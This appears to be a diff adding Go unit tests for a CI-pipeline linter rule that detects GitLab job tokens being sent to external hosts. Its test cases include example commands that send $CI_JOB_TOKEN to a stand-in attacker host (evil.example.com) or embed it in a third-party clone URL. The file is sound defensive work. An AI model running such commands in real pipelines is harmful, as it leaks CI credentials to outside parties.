@@ -4,6 +4,7 @@
 package rules
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/glsec/glsec/internal/finding"
@@ -137,5 +138,36 @@ upload:
 	}
 	if f[0].Line == 0 {
 		t.Error("expected non-zero line number")
+	}
+}
+
+func TestGL004_PerCommand(t *testing.T) {
+	for _, tc := range []struct {
+		name, script string
+		want         int
+		host         string
+	}{
+		{"token to external host", `curl --header "JOB-TOKEN: $CI_JOB_TOKEN" https://evil.example.com/collect`, 1, "evil.example.com"},
+		{"--url= form", `tool --token "$CI_JOB_TOKEN" --url=https://evil.example.com`, 1, "evil.example.com"},
+		{"git clone with userinfo", `git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@github.com/org/repo.git`, 1, "github.com"},
+		{"userinfo with variable host", `git remote set-url origin https://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_FQDN}/${CI_PROJECT_PATH}.git`, 0, ""},
+		{"oauth2 userinfo, variable host", `git clone https://oauth2:${CI_JOB_TOKEN}@$CI_SERVER_HOST/group/p.git`, 0, ""},
+		{"URL as form value", `curl -F "token=$CI_JOB_TOKEN" -F "variables[URL]=https://campaign.example.com" $TRIGGER_URL`, 0, ""},
+		{"URL in another command of the block", "echo \"Docs: https://docs.example.com/nuget\"\ndotnet nuget push p.nupkg --api-key \"$CI_JOB_TOKEN\" --source \"$CI_SERVER_URL/api/v4/projects/1/packages/nuget/index.json\"", 0, ""},
+		{"gitlab.com", `curl -H "JOB-TOKEN: $CI_JOB_TOKEN" https://gitlab.com/api/v4/projects`, 0, ""},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			doc, err := parser.Parse([]byte("job:\n  script:\n    - |\n      "+strings.ReplaceAll(tc.script, "\n", "\n      ")+"\n"), "t.yml")
+			if err != nil {
+				t.Fatal(err)
+			}
+			f := GL004.Check(doc.Root, "t.yml")
+			if len(f) != tc.want {
+				t.Fatalf("expected %d findings, got %d: %v", tc.want, len(f), f)
+			}
+			if tc.want == 1 && !strings.Contains(f[0].Message, `"`+tc.host+`"`) {
+				t.Errorf("message names the wrong host: %s", f[0].Message)
+			}
+		})
 	}
 }
